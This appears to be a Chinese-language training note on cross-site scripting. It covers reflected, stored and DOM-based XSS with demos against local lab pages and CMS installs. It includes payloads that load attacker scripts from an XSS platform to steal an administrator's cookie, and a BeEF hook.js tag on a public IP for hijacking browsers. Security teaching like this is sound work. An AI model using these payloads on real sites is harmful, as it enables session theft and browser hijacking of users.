![1645667960238-84141666-0890-4819-b959-05f1cdadc995.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171843628-1654525159.png)

```plain
#知识点：
1、XSS跨站-原理&攻击&分类等
2、XSS跨站-反射型&存储型&DOM型等
3、XSS跨站-攻击手法&劫持&盗取凭据等
4、XSS跨站-攻击项目&XSS平台&Beef-XSS

1、原理
指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本。
-数据交互的地方
	get、post、headers
	反馈与浏览
	富文本编辑器
	各类标签插入和自定义
-数据输出的地方
	用户资料
	关键词、标签、说明
	文件上传

2、分类
反射型（非持久型）
存储型（持久型）
DOM型
mXSS(突变型XSS) 
UXSS（通用型xss）
Flash XSS
UTF-7 XSS
MHTML XSS
CSS XSS 
VBScript XSS

3、危害（执行JavaScript代码）
理论上JavaScript功能能实现的，XSS就能实现
网络钓鱼，包括获取各类用户账号；
窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；
劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；
强制弹出广告页面、刷流量等；
网页挂马；
进行恶意操作，如任意篡改页面信息、删除文章等；
进行大量的客户端攻击，如ddos等；
获取客户端信息，如用户的浏览历史、真实ip、开放端口等；
控制受害者机器向其他网站发起攻击；
结合其他漏洞，如csrf,实施进一步危害；
提升用户权限，包括进一步渗透网站；
传播跨站脚本蠕虫等

4、修复
见绕过课程对比参考

#XSS跨站系列内容：
1、XSS跨站-原理&分类&手法
2、XSS跨站-探针&利用&审计
3、XSS跨站-另类攻击手法利用
4、XSS跨站-防御修复&绕过策略
```

![1645676102364-3d7c9835-2926-4b89-bbe1-2a7dc2830058.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834314-1421941740.png)

![1645676066748-edae56e3-341d-43e8-aa5a-723282b9ba90.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834623-1375811154.png)

- XSS跨站-原理&分类&手法&探针

------

```plain
原理：
https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin

这个漏洞是产生在前端的漏洞。

产生的地方：输出的地方。（把数据进行交互）


分类：
反射型（非持久型）
存储型（持久型）
DOM型
mXSS(突变型XSS) 
UXSS（通用型xss）
Flash XSS
UTF-7 XSS
MHTML XSS
CSS XSS 
VBScript XSS

重点是前三类：
反射型（非持久型）
存储型（持久型）
DOM型



危害：JavaScript代码的执行（理论上：在JavaScript代码能执行的东西，那么这个漏洞就能实现）
为什么说理论上呢，在实际情况下可能会受到长度限制，关键性过滤，或者浏览器防御。
反射型（非持久型）

//反射型
$code=$_GET['x'];
echo $code;
最简单的代码实现，接受变量，输出变量。
```

![1645683811829-c0f61484-b93c-4fb2-9b10-eaef57df90f9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833477-193473596.png)

```plain
x接收到值会在页面中显示。
假如传输x的值改成JavaScript代码，就会出现弹窗：
正常写法：http://127.0.0.1:8081/web/mysql/xss.php?x=12345
弹窗写法：http://127.0.0.1:8081/web/mysql/xss.php?x=<script>alert(1)</script>
```

![1645683999509-6bf6ccd3-9921-41bc-9467-8d7ff4e8d2d6.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834639-1759214086.png)

```plain
查看源代码，发现显示内容会出现在检查元素中
```

![1645684131428-2b212dd0-2955-4406-b398-2330a3ecdb03.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833604-1313766112.png)

```plain
按正常来说，应该显示<script>alert(1)</script>，但是这里显示空白。是因为这段代码被当成JavaScript代码去执行了。执行出的效果就是弹窗。
在产生过程中，有一个输入的值，还有个输出的值。这就是跨站产生的基本原理。
正常写法：http://127.0.0.1:8081/web/mysql/xss.php?x=12345
触发漏洞写法：http://127.0.0.1:8081/web/mysql/xss.php?x=<script>alert(1)</script>
这个漏洞是一次性的，只有访问http://127.0.0.1:8081/web/mysql/xss.php?x=<script>alert(1)</script>这样的地址才可以触发此类漏洞。
必须构造给别人，才能触发漏洞。


存储型（持久型）（攻击代码写在了数据库里）
类似留言板，评论地方。（之前留言会被后面看到）
攻击者植入了攻击代码xss，之后的人只要访问留言板都会受到攻击
比如访问http://127.0.0.1:8081/web/mysql/gbook.php 
就会直接弹窗。

安全产商一般只会接受存储型，不会接受反射型跨站。
DOM型
这类漏洞只产生在前端，没有数据库和后端的交互。

产生代码：
function domxss(){
                var str = document.getElementById("text").value;
                document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
            }
            

接受数据的代码和输出数据的代码全都在前端实现了，没有经过后端的处理。

这段代码的解释：
对传过来的数据进行接受赋值给str，str在进行接连地址，构造一个完整的地址。
比如输入123，然后点击，他的地址就会变成http://127.0.0.1:8081/web/mysql/123
这个值在<a href="123">what do you see?</a>这里显示，那么就可以构造payload
' onclick="alert('xss')">
'><img src="#" onmouseover="alert('xss')">

对写进去的值进行拼接：<a href="" onclick="alert('xss')">'&gt;what do you see?</a>
点击就会形成弹窗
```

![1645686052139-f86a19f9-efac-4292-9a86-5d4af5ed8ea5.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833770-415007411.png)

- 反射型实例-UA查询平台数据输出

------

```plain
平台：useragent.openadmintools.com

访问这个平台，可以发现他抓取了浏览器信息。从新进行访问，抓包，修改数据包UA头。
```

![1645686384234-e86fc38c-4c85-4f5c-a373-fc861c52bf81.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834237-742169747.png)

```plain
数据包发送，就可以看到浏览器弹窗。
```

![1645686489536-6e2c8aaf-2e95-4de9-bb8d-2bdb2cd4cf0c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834142-22545738.png)

```plain
但是这类漏洞构成危害不大。因为这个需要在UA头中修改，那么要怎么发给别人。别人访问的时候又不会修改UA头再去访问。所以这个漏洞很难。
```

- 存储型实例-订单系统CMS权限获取

------

```plain
安装jfdd，后台登录失败。但是这个cms类似于后台留言，下订单等。

下订单，留言一般会在后台显示，前台进行留言，后台进行查看。这就形成了xss攻击。

进行留言，在留言上写上payload
```

![1645689749369-141f8ac9-902a-4d19-9375-cc0c5e822bfe.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833760-1297987855.png)

```plain
这样在后台登录，就可以执行JavaScript代码。这样后台管理员就造到了xss攻击。这个还是存储型跨站。

那么如何获取管理员的cookie呢
找一个xss平台，注册一个账号：https://xss.pt/xss.php

创建项目，然后进行功能选择，查看代码
```

![1645690039564-0e49524e-a0bb-4bc7-a66a-486df581885e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833907-426502537.png)

```plain
复制一个代码：<sCRiPt sRC=//xss.pt/X8Vz></sCrIpT>
然后写在订单中。等待管理员访问。在下面等待数据的接受。
```

![1645690168031-33c796d0-761c-4687-a172-6e7248c1e35a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833711-1973986632.png)

```plain
在后台中登录，查看玩网络元素，会自动加载地址xss.php地址。
在xss.php平台上获取了cookie信息。可以尝试对后天地址访问。

比如对后台admin/admin.php?uid=3进行访问，抓包。对获得的cookie信息复制到数据包中。
但是这个cookie不能进行登录，因为在正常登录中cookie中有一个phpsessid的值，而获取的cookie信息没有phpsessid的值
这个网站采用的不是cookie验证，而是phpsessid进行验证。获取httponly也可以进行保护。
```

- DOM型实例-EmpireCMS前端页面审计

------

```plain
DOM类型的全都是前端的代码，所以基本上都是白盒审计。
在upload/e/Viewimg/index.html 发现关键代码：
if(Request("url")!=0){
	document.write("<a title=\"点击观看完整的图片...\" href=\""+Request("url")+"\" target=\"_blank\"><img src=\""+Request("url")+"\" border=0 class=\"picborder\" onmousewheel=\"return bbimg(this)\" onload=\"if(this.width>screen.width-500)this.style.width=screen.width-500;\">");
    }
```

![1645699200929-a2d80c2b-3419-413f-9d97-07353dcb9e64.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171833732-1683164755.png)

```plain
追踪request函数
```

![1645699266665-6e3fd05c-1d6e-4a0f-aa2b-c4a7145c4e50.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834168-1926646980.png)

```plain
简单来说，这个request函数就是用来接收URL的地址
那么要怎么构造他呢？
访问地址http://127.0.0.1:8103/e/Viewimg/index.html
测试：http://127.0.0.1:8103/e/Viewimg/index.html?url=1
```

![1645699547602-9c66a3b0-02b0-444c-8614-c6e1acfe4f85.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834197-106608097.png)

```plain
点击图片后出现的地址http://127.0.0.1:8103/e/Viewimg/1
证明URL后面的参数拼接在URL后面了，那么应该怎么触发跨站呢？
http://127.0.0.1:8103/e/Viewimg/index.html?url=javascript:alert(1)
这样子构造在源代码中
document.write("<a title=\"点击观看完整的图片...\" href=\""+javascript:alert(1)+"\" target=\"_blank\"><img src=\""+Request("url")+"\" border=0 class=\"picborder\" onmousewheel=\"return bbimg(this)\" onload=\"if(this.width>screen.width-500)this.style.width=screen.width-500;\">");



点击后的地址进行了弹窗
```

![1645699830809-0e74fa09-b2a0-4185-8887-45103080c9b4.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834375-1964363030.png)

```plain
49.234.224.93
120.26.128.143:8086
```

- XSS利用环境-XSS平台&Beef-XSS项目

------

```plain
xss平台：xss.pt
一般只是用来获取cookie信息
Beef-XSS
搭建：https://blog.csdn.net/qq_40624810/article/details/110958036
下载完docker后，运行命令docker run --rm -p 3000:3000 janes/beef
```

![1645691401391-e0110e15-ff2f-49b5-ad6a-2bae8c713f5d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834309-739208784.png)

```plain
安装完成后，访问http://47.100.167.248:3000/ui/panel
默认账号密码beef,beef

在这个网站下面有一个hook.js文件，只要加载了这个地址，就会劫持这个浏览器。
那么如何执行这个呢
<script src="http://47.100.167.248:3000/hook.js"></script>
这个平台也可以获取cookie，跳转，下载，钓鱼，伪装成flash。
```

![1645695809407-41cf15bd-ec2b-451f-a348-55405a084e6a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912171834321-463263230.png)